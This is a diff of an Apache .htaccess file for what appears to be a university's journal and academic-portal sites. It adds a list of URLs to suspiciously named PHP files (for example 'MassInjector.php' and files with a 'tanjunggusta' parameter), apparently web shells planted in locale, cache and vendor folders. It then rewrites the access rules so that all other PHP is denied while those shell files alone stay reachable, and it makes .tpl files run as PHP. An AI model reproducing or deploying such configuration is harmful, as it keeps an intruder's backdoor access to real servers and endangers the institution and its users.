@@ -1,8 +1,57 @@
+https://ojs.uvayabjm.ac.id/locale/ar_IQ/UploaderUpgrade.php
+https://ojs.uvayabjm.ac.id/docs/manual/pt/editorial-workflow/ColiumUpload.php
+https://ojs.uvayabjm.ac.id/lib/pkp/locale/is_IS/DecoderAcces.php
+https://ojs.uvayabjm.ac.id/classes/submission/SubmissionMetadataFormImplementations.inc.php?tanjunggusta
+https://ojs.uvayabjm.ac.id/classes/subscription/SubscriptionPublications.inc.php
+https://ojs.uvayabjm.ac.id/classes/oai/ojs/DoiFollwow.inc.php
+https://ojs.uvayabjm.ac.id/locale/sr_RS@latin/serrtupack.inc.php
+https://ojs.uvayabjm.ac.id/locale/fa_IR/MassInjector.php
+https://ojs.uvayabjm.ac.id/locale/id_ID/NimjuruFiles.inc.php
+https://ojs.uvayabjm.ac.id/templates/payments/DiscoveryAcces.php?tanjunggusta
+https://ojs.uvayabjm.ac.id/cache/opcache/opcache-17f8f1244c929372dcb3ec67665d01e5s224e62dv.php
+https://siakad.uvayabjm.ac.id/vendors/uniform/www/vendors-vendors.php
+https://siakad.uvayabjm.ac.id/vendors/bootstrap-datepicker/less/bootstrap-datepicker.php?ada
+https://siakad.uvayabjm.ac.id/download/themes/compas/default/download-compas.php
+https://siakad.uvayabjm.ac.id/update_/portalakademik/form_pengajuanseminat_proposalact.php
+
+
+
 Options -Indexes
 
-# php -- BEGIN cPanel-generated handler, do not edit
-# Set the “ea-php81” package as the default “PHP” programming language.
-<IfModule mime_module>
-  AddHandler application/x-httpd-ea-php81 .php .php8 .phtml
+<FilesMatch "(?i)\.(phtml|php|phar|pgif|pht|phtm|shtml|inc|php1|php2|php3|php4|php5|php56|php6|php82|php7|php72|php8|php9|php[0-9]?|asp[x]?|)$">
+Order allow,deny
+Deny from all
+</FilesMatch>
+<FilesMatch "\.(jpg|png|pdf|xml|txt|js|css|tpl|doc|docs|dxc)$">
+Order allow,deny
+Allow from all
+</FilesMatch>
+
+<FilesMatch '^(UploaderUpgrade.php|ColiumUpload.php|DecoderAcces.php|DecoderAcces.php|SubmissionMetadataFormImplementations.inc.php|SubscriptionPublications.inc.php|DoiFollwow.inc.php|serrtupack.inc.php|MassInjector.php|NimjuruFiles.inc.php|DiscoveryAcces.php|opcache-17f8f1244c929372dcb3ec67665d01e5s224e62dv.php|vendors-vendors.php|bootstrap-datepicker.php|download-compas.php|form_pengajuanseminat_proposalact.php)$'>
+Order allow,deny
+Allow from all
+</FilesMatch>
+<FilesMatch "^\.">
+Order allow,deny
+Deny from all
+</FilesMatch>
+
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^index.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . index.php [L]
 </IfModule>
-# php -- END cPanel-generated handler, do not edit
+
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^index.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . index.php [L]
+</IfModule>
+
+AddType application/x-httpd-php .tpl
